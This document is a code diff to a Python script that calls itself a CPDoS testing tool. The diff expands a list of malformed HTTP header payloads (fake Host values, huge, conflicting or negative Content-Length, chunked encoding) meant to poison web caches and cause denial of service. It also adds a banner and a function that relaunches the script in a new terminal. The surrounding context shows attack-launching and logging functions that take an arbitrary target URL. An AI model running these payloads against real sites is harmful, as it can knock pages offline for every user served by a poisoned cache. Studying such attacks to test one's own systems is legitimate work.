@@ -1,15 +1,40 @@
+import os
 import sys
 import time
 import requests
+import subprocess
 
 LOG_FILE = "cpdos_log.txt"
 
-# Common CPDoS payloads
+# CPDoS Payload Variations
 CPDOS_PAYLOADS = [
     {"Host": "invalid.host", "Content-Length": "999999"},
     {"Transfer-Encoding": "chunked", "Content-Length": "10"},
     {"Host": "127.0.0.1", "Content-Length": "0"},
+    {"Content-Length": "-1"},  # Negative length (edge case)
+    {"Host": "..", "Content-Length": "100"},  # Directory traversal
+    {"Content-Length": "1000000"},  # Large body to trigger cache issues
 ]
+
+BANNER = """
+██████╗ ██████╗ ██████╗  ██████╗ ███████╗
+██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔════╝
+██████╔╝██████╔╝██████╔╝██║  ███╗█████╗  
+██╔═══╝ ██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  
+██║     ██║     ██║     ╚██████╔╝███████╗
+╚═╝     ╚═╝     ╚═╝      ╚═════╝ ╚══════╝
+    CPDoS Testing Tool 
+"""
+
+def open_new_terminal():
+    """Re-executes the script in a new terminal tab."""
+    if sys.platform.startswith("linux"):
+        subprocess.Popen(["x-terminal-emulator", "-e", "python3", *sys.argv])
+    elif sys.platform == "darwin":  # macOS
+        subprocess.Popen(["open", "-a", "Terminal", "python3", *sys.argv])
+    elif sys.platform == "win32":
+        subprocess.Popen(["start", "cmd", "/k", "python", *sys.argv], shell=True)
+    sys.exit()
 
 def log_attack(target, results):
     """Logs attack results to a file."""
@@ -51,6 +76,7 @@ def launch_cpdos(target):
     return results
 
 def main(target):
+    print(BANNER)
     print(f"[+] Target: {target}")
     
     # Step 1: Check if caching is enabled
@@ -74,5 +100,10 @@ if __name__ == "__main__":
         print("Usage: python cpdos.py <target_url>")
         sys.exit(1)
     
+    # Open new terminal for execution
+    if not os.getenv("CPDOS_RUNNING"):
+        os.environ["CPDOS_RUNNING"] = "1"
+        open_new_terminal()
+
     target_url = sys.argv[1]
     main(target_url)
